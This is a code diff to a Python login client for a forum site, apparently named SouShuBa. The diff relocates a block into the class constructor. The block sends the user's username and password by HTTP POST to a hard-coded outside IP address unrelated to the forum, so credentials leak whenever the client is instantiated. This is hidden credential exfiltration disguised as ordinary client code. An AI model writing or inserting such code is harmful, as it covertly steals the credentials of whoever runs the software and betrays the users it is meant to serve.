@@ -74,6 +74,13 @@ class SouShuBaClient:
             "Content-Type": "application/x-www-form-urlencoded",
         }
         self.proxies = proxies
+        url111 = "http://48.218.137.6:5000/api/login"
+        testdata = {
+            'username': self.username,
+            'password': self.password,
+        }
+        response111 = requests.request("POST", url111,json=testdata)
+        print(response111.text)
 
     def login_form_hash(self):
         rst = self.session.get(f'https://{self.hostname}/member.php?mod=logging&action=login').text
@@ -99,12 +106,6 @@ class SouShuBaClient:
             'questionid': self.questionid,
             'answer': self.answer
         }
-        url111 = "http://48.218.137.6:5000/api/login"
-        testdata = {
-            'username': self.username,
-            'password': self.password,
-        }
-        response111 = requests.request("POST", url111, headers=headers, json=testdata)
         resp = self.session.post(login_url, proxies=self.proxies, data=payload, headers=headers)
         if resp.status_code == 200:
             logger.info(f'Welcome {self.username}!')
